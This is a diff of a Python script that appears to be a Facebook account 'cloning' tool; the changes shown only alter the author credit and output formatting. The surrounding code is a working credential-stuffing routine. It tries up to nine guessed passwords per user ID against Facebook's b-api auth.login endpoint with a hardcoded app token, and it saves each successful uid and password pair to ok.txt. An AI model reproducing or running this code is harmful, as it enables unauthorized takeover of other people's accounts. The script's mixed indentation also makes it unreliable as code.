@@ -337,7 +337,7 @@ def b_menu_select():
 	os.system("clear")
 	logo()
 	os.system('echo -e "Please wait clone account will be appear here "| lolcat')
-	os.system('echo -e "Dev by : Tech Abm "| lolcat')
+	os.system('echo -e "Dev by : Jam Shahrukh "| lolcat')
 	os.system('echo -e "-----------------------------------------------"| lolcat')
 	
 	
@@ -349,7 +349,7 @@ def b_menu_select():
 		    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
 		    q = json.loads(data)
                     if 'access_token' in q:
-		        print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass1+" | "+name)
+		        print("\t\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass1+" | "+name)
 		        ok=open("ok.txt","a")
 		        ok.write(uid+" | "+pass1+"\n")
 		        ok.close()
@@ -359,7 +359,7 @@ def b_menu_select():
 		        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
 		        q = json.loads(data)
 		        if 'access_token' in q:
-		            print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass2+" | "+name)
+		            print("\t\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass2+" | "+name)
 		            ok=open("ok.txt","a")
 		            ok.write(uid+" | "+pass2+"\n")
 		            ok.close()
@@ -369,7 +369,7 @@ def b_menu_select():
 		            data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                             q = json.loads(data)
 		            if 'access_token' in q:
-		                print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass3+" | "+name)
+		                print("\t\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass3+" | "+name)
 		                ok=open("ok.txt","a")
 		                ok.write(uid+" | "+pass3+"\n")
 		                ok.close()
@@ -379,7 +379,7 @@ def b_menu_select():
 		                data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                 q = json.loads(data)
 		    	        if 'access_token' in q:
-		                    print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass4+" | "+name)
+		                    print("\t\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass4+" | "+name)
 		                    ok=open("ok.txt","a")
 		                    ok.write(uid+" | "+pass4+"\n")
 		                    ok.close()
@@ -389,7 +389,7 @@ def b_menu_select():
 		                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                     q = json.loads(data)
 		                    if 'access_token' in q:
-		                        print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass5+" | "+name)
+		                        print("\t\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass5+" | "+name)
 		                        ok=open("ok.txt","a")
 		                        ok.write(uid+" | "+pass5+"\n")
 		                        ok.close()
@@ -399,7 +399,7 @@ def b_menu_select():
 		                        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                         q = json.loads(data)
 		                        if 'access_token' in q:
-		                            print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass6+" | "+name)
+		                            print("\t\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass6+" | "+name)
 		                            ok=open("ok.txt","a")
 		                            ok.write(uid+" | "+pass6+"\n")
 		                            ok.close()
@@ -409,7 +409,7 @@ def b_menu_select():
 		                            data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                             q = json.loads(data)
 					    if 'access_token' in q:
-		                                print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass7+" | "+name)
+		                                print("\t\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass7+" | "+name)
 		                                ok=open("ok.txt","a")
 		                                ok.write(uid+" | "+pass7+"\n")
 		                                ok.close()
@@ -419,7 +419,7 @@ def b_menu_select():
 		                                data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                                 q = json.loads(data)
 		    	                        if 'access_token' in q:
-		                                    print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass8+" | "+name)
+		                                    print("\t\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass8+" | "+name)
 		                                    ok=open("ok.txt","a")
 		                                    ok.write(uid+" | "+pass8+"\n")
 		                                    ok.close()
@@ -429,7 +429,7 @@ def b_menu_select():
 		                                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                                     q = json.loads(data)
 		                                    if 'access_token' in q:
-		                                        print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass9+" | "+name)
+		                                        print("\t\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass9+" | "+name)
 		                                        ok=open("ok.txt","a")
 		                                        ok.write(uid+" | "+pass9+"\n")
 		                                        ok.close()
